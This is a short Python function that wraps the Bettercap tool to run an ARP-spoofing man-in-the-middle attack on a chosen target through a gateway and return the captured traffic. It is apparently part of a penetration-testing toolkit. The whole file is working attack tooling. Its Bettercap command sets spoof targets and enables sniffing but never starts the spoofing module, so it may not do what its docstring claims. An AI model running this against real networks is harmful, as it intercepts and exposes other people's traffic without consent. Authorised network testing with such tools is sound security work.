
import subprocess
import shlex
import time


def wireless_tests(target: str,
                   gateway: str,
                   iface: str = "wlan0",
                   duration: int = 30) -> str:
    """
    Perform an ARP‐spoofing MITM against 'target' via 'gateway' using Bettercap.
    - iface: the network interface (must be up in managed mode)
    - duration: seconds to sniff traffic
    Requires: bettercap in your PATH.
    """
    if not target or not gateway:
        raise ValueError("wireless_tests: target and gateway are required")

    results = []
    results.append(
        f"=== Bettercap MITM on {target} via {gateway} (iface {iface}) ===")

    eval_script = (
        f"set arp.spoof.targets {target}; "
        f"set arp.spoof.internal true; "
        f"net.sniff on; "
        f"sleep {duration}; "
        f"net.sniff off; "
        f"exit"
    )
    cmd = [
        "bettercap",
        "-iface", iface,
        "-eval", eval_script
    ]

    try:
        # Run Bettercap and capture its entire output
        out = subprocess.check_output(
            cmd, stderr=subprocess.STDOUT, text=True, timeout=duration+10)
        results.append(out)
    except FileNotFoundError:
        results.append(
            "ERROR: bettercap not found. Install it and ensure it's in your PATH.")
    except subprocess.TimeoutExpired:
        results.append(
            "INFO: MITM sniff timed out (sniffer stopped after duration).")
    except subprocess.CalledProcessError as e:
        results.append(
            f"ERROR: bettercap exited with code {e.returncode}\n{e.output}")
    except Exception as e:
        results.append(f"ERROR: unexpected exception: {e}")

    return "\n".join(results)
